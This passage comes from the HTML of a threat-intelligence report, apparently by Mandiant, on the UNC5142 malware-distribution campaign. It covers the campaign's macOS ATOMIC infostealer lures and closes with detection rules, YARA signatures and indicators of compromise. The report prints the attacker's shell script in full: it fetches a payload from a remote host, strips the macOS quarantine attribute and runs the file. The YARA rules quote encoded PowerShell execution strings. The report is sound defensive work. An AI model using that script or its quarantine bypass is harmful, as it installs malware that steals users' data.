sending a single, cheap transaction to their smart contract.</span></p>\n<p><span style=\"vertical-align: baseline;\">In the infection chain leading to RADTHIEF, Mandiant Threat Defense observed the actor reverting to the older, static method of hardcoding the first-stage URL directly into the lure. This demonstrates that </span><span style=\"vertical-align: baseline;\">UNC5142 uses a flexible approach, adapting its infection methods to suit each campaign.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Targeting macOS</span></h3>\n<p><span style=\"vertical-align: baseline;\">Notably, the threat cluster has targeted both Windows and macOS systems with their distribution campaigns. In February 2025 and again in April 2025, UNC5142 distributed ATOMIC, an infostealer tailored for macOS. The social engineering lures for these campaigns evolved; while the initial February lure explicitly stated “Instructions For MacOS”, the later April versions were nearly identical to the lures used in their Windows campaigns (Figure 18 and Figure 19). In the February infection chain, the lure prompted the user to run a bash command that retrieved a shell script (Figure 18). This script then used </span><code style=\"vertical-align: baseline;\">curl</code><span style=\"vertical-align: baseline;\"> to fetch the ATOMIC payload from the remote server </span><code style=\"vertical-align: baseline;\">hxxps[:]//browser-storage[.]com/update</code><span style=\"vertical-align: baseline;\"> and writes the ATOMIC payload to a file named </span><code style=\"vertical-align: baseline;\">/tmp/update</code><span style=\"vertical-align: baseline;\">. (Figure 20). The use of the </span><code style=\"vertical-align: baseline;\">xattr</code><span style=\"vertical-align: baseline;\"> command within the bash script is a deliberate defense evasion technique designed to remove the </span><code style=\"vertical-align: baseline;\">com.apple.quarantine</code><span style=\"vertical-align: baseline;\"> attribute, which prevents macOS from displaying the security prompt that normally requires user confirmation before running a downloaded application for the first time.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"macOS “Installation Instructions” CLEARSHORT lure from February 2025\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc5142-etherhiding-fig18.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 18: macOS “Installation Instructions” CLEARSHORT lure from February 2025</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--medium\n      \n      \n        h-c-grid__col\n        \n        h-c-grid__col--4 h-c-grid__col--offset-4\n        \n      \">\n\n      \n      \n        \n        <img alt=\"macOS “Verification Steps” CLEARSHORT lure from May 2025\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc5142-etherhiding-fig19.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 19: macOS “Verification Steps” CLEARSHORT lure from May 2025</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>curl -o /tmp/update https://browser-storage[.]com/update\nxattr -c /tmp/update\nchmod +x /tmp/update\n/tmp/update</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 20: install.sh shell script contents</span></p></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Outlook &amp; Implications</span></h3>\n<p><span style=\"vertical-align: baseline;\">Over the past year, UNC5142 has demonstrated agility, flexibility, and an interest in adapting and evolving their operations. Since mid-2024, the threat cluster has tested out and incorporated a wide swath of changes, including the use of multiple smart contracts, AES-encryption of secondary payloads, CloudFlare .dev pages to host landing pages, and the introduction of the ClickFix social engineering technique. It is likely these changes are an attempt to bypass security detections, hinder or complicate analysis efforts, and increase the success of their operations. The reliance on legitimate platforms such as the BNB Smart Chain and Cloudflare pages may lend a layer of legitimacy that helps evade some security detections. Given the frequent updates to the infection chain coupled with the consistent operational tempo, high volume of compromised websites, and diversity of distributed malware payloads over the past year and a half, it is likely that UNC5142 has experienced some level of success with their operations. Despite what appears to be a cessation or pause in UNC5142 activity since July 2025, the threat cluster’s willingness to incorporate burgeoning technology and their previous tendencies to consistently evolve their TTPs could suggest they have more significantly shifted their operational methods in an attempt to avoid detection. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Acknowledgements</span></h3>\n<p><span style=\"vertical-align: baseline;\">Special acknowledgment to Cian Lynch for involvement in tracking the malware as a service distribution cluster, and to Blas Kojusner for assistance in analyzing infostealer malware samples. We are also grateful to Geoff Ackerman for attribution efforts, as well as Muhammad Umer Khan and Elvis Miezitis for providing detection opportunities. A special thanks goes to Yash Gupta for impactful feedback and coordination, and to Diana Ion for valuable suggestions on the blog post.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Detection Opportunities</span></h3>\n<p><span style=\"vertical-align: baseline;\">The following indicators of compromise (IOCs) and YARA rules are also available as a collection and rule pack in Google Threat Intelligence (GTI). </span></p>\n<h4><span style=\"vertical-align: baseline;\">Detection Through Google Security Operations</span></h4>\n<p><span style=\"vertical-align: baseline;\">Mandiant has made the relevant rules available in the Google SecOps Mandiant Frontline Threats </span><a href=\"https://cloud.google.com/chronicle/docs/detection/curated-detections\"><span style=\"text-decoration: underline; vertical-align: baseline;\">curated detections</span></a><span style=\"vertical-align: baseline;\"> rule set. The activity detailed in this blog post is associated with several specific MITRE ATT&amp;CK tactics and techniques, which are detected under the following rule names:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Run Utility Spawning Suspicious Process</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Mshta Remote File Execution</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Powershell Launching Mshta</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Dns Lookup Events To C2 Top Level Domains</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Network Connections To Mediafire</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Mshta Launching Powershell</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Explorer Launches Powershell Hidden Execution</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">MITRE ATT&amp;CK </span></h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; width: 100%;\"><colgroup><col style=\"width: 68.6238%;\" /><col style=\"width: 14.0157%;\" /><col style=\"width: 17.3212%;\" /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Rule Name</span></strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Tactic</span></strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Technique</span></strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Run Utility Spawning Suspicious Process</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TA0003</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1547.001</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Mshta Remote File Execution</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TA0005</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1218.005</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Powershell Launching Mshta</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TA0005</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1218.005</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Dns Lookup Events To C2 Top Level Domains</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TA0011</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1071.001</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Network Connections To Mediafire</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TA0011</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1071.001</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Mshta Launching Powershell</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TA0005</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1218.005</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Explorer Launches Powershell Hidden Execution</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TA0002</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1059.001</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">YARA Rules</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule M_Downloader_CLEARSHORT_1 {\n    meta:\n        author = \"Mandiant\"\n    strings:\n        $payload_b641 = \"ipconfig /flushdns\" base64\n        $payload_b642 = \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\" base64\n        $payload_b643 = \"[System.Diagnostics.Process]::Start(\" base64\n        $payload_b644 = \"-ep RemoteSigned -w 1 -enc\" base64\n\n        $payload_o1 = \"ipconfig /flushdns\" nocase ascii wide\n        $payload_o2 = \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\" nocase ascii wide\n        $payload_o3 = \"[System.Diagnostics.Process]::Start(\" nocase ascii wide\n        $payload_o4 = \"-ep RemoteSigned -w 1 -enc\" nocase ascii wide\n\n\n        $htm_o1 = \"title: \\\"Google Chrome\\\",\"\n        $htm_o2 = \"PowerShell\"\n        $htm_o3 = \"navigator.clipboard.writeText\"\n        $htm_o4 = \"document.body.removeChild\"\n        $htm_o5 = \"downloadButton.classList.add('downloadButton');\"\n        $htm_o6 = \"getUserLanguage().substring(0, 2);\"\n        $htm_o7 = \"translateContent(userLang);\" \n        \n        $htm_b64_1 = \"title: \\\"Google Chrome\\\",\" base64  \n        $htm_b64_2 = \"PowerShell\" base64 \n        $htm_b64_3 = \"navigator.clipboard.writeText\" base64  \n        $htm_b64_4 = \"document.body.removeChild\" base64  \n        $htm_b64_5 = \"downloadButton.classList.add('downloadButton');\" base64  \n        $htm_b64_6 = \"getUserLanguage().substring(0, 2);\" base64  \n        $htm_b64_7 = \"translateContent(userLang);\" base64  \n    condition:\n        filesize&lt;1MB and (4 of ($payload_b*) or 4 of ($payload_o*) or 4 of ($htm_b*) or  4 of ($htm_o*))\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule M_Downloader_CLEARSHORT_2 {\n    meta:\n          author = \"Mandiant\"\n    strings:\n        $htm1 = \"const base64HtmlContent\"\n        $htm2 = \"return decodeURIComponent(escape(atob(str)));\"\n        $htm3 = \"document.body.style.overflow = 'hidden';\"\n        $htm4 = \"document.body.append(popupContainer);\"\n        $htm5 = \"Object.assign(el.style, styles);\"\n        \n        \n        $htm_b64_1 = \"const base64HtmlContent\" base64\n        $htm_b64_2 = \"return decodeURIComponent(escape(atob(str)));\" base64\n        $htm_b64_3 = \"document.body.style.overflow = 'hidden';\" base64\n        $htm_b64_4 = \"document.body.append(popupContainer);\" base64\n        $htm_b64_5 = \"Object.assign(el.style, styles);\" base64\n\n    condition:\n        filesize&lt;1MB and 5 of ($htm*)\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule M_Downloader_CLEARSHORT_3\n{\n    meta:\n        author = \"Mandiant\"\n    strings:\n          \n        $smart_contract1 = \"9179dda8B285040Bf381AABb8a1f4a1b8c37Ed53\" nocase\n        $smart_contract2 = \"8FBA1667BEF5EdA433928b220886A830488549BD\" nocase\n        $smart_contract3 = \"53fd54f55C93f9BCCA471cD0CcbaBC3Acbd3E4AA\" nocase\n        $smart_contract2_hex = /38(46|66)(42|62)(41|61)31363637(42|62)(45|65)(46|66)35(45|65)(64|44)(41|61)343333393238(42|62)323230383836(41|61)383330343838353439(42|62)(44|64)/\n        $smart_contract1_hex = /39313739(64|44)(64|44)(61|41)38(42|62)323835303430(42|62)(66|46)333831(41|61)(41|61)(42|62)(62|42)38(61|41)31(66|46)34(61|41)31(62|42)38(63|43)3337(45|65)(64|44)3533/\n        $smart_contract3_hex = /3533(66|46)(64|44)3534(66|46)3535(43|63)3933(66|46)39(42|62)(43|63)(43|63)(41|61)343731(63|43)(44|64)30(43|63)(63|43)(62|42)(61|41)(42|62)(43|63)33(41|61)(63|43)(62|42)(64|44)33(45|65)34(41|61)(41|61)/\n\n        $enc_marker1 = \"4834734941444748553263432f34315662572f624\"\n        $enc_marker2 = \"4834734941465775513263432f2b3257775772\"\n\n        $c2_marker_capcha = \"743617074636861\"\n        $c2_marker_https = \"68747470733a2f2f72\"\n        $c2_marker_json = \"\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":\\\"\"\n\n        $str1 = /Windows\\s*\\+\\s*R/ nocase\n        $str2 = /CTRL\\s*\\+\\s*V/ nocase\n        $str3 = \"navigator.clipboard.writeText\" nocase\n        $str4 = \"captcha\" nocase\n        $str5 = \".innerHTML\" nocase\n    \n        $payload1 = \".shop\" base64\n        $payload2 = \"[scriptblock]::Create(\" nocase\n        $payload3 = \"HTA:APPLICATION\" nocase\n    condition:\n\t\tfilesize &lt; 15MB and (any of ($smart_contract*) or any of ($enc_marker*) or all of ($c2_marker*) or all of ($str*) or all of ($payload*))\n\n\n\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4>Host-Based IOCs</h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; width: 100%;\"><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">SHA256</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Malware Family</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">bcbdb74f97092dfd68e7ec1d6770b6d1e1aae091f43bcebb0b7bce6c8188e310</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VIDAR</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">88019011af71af986a64f68316e80f30d3f57186aa62c3cef5ed139eb49a6842</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VIDAR</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">27105be1bdd9f15a1b1a2b0cc5de625e2ecd47fdeaed135321641eea86ad6cb0</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VIDAR</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">72d8fa46f402dcc4be78306d0535c9ace0eb9fabae59bd3ba3cc62a0bdf3db91</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">3023b0331baff73ff894087d1a425ea4b2746caf514ada624370318f27e29c2c</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">4b47b55ae448668e549ffc04e82aee41ac10e3c8b183012a105faf2360fc5ec1</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">RADTHIEF</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">091f9db54382708327f5bb1831a4626897b6710ffe11d835724be5c224a0cf83</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ATOMIC</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4>Network-Based IOCs</h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; width: 100%;\"><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Date</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">CLEARSHORT Hosting URL</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-05-30</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://yie-cpj[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-05-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://n51v[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-05-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://lightsoi[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-05-01</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://stat[.]bluetroniq[.]vip/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-05-01</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://tnop[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-30</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://app.bytevista[.]cloud/wfree</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-30</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://ho8[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-30</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://z1z[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-30</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://yuun[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-29</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://tuboos[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-29</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://min-js-lib[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-28</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://yoloff[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-28</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://relmake[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-26</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://javascript-67t[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-25</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://sticker-88l[.]pages[.]dev/support</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-24</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://know-knock-who-is-here[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-23</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://ndgadfqwywqe[.]pages[.]dev/win</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-23</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://jjiiiiiiiiijjjj[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-22</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://gthfjdk[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: 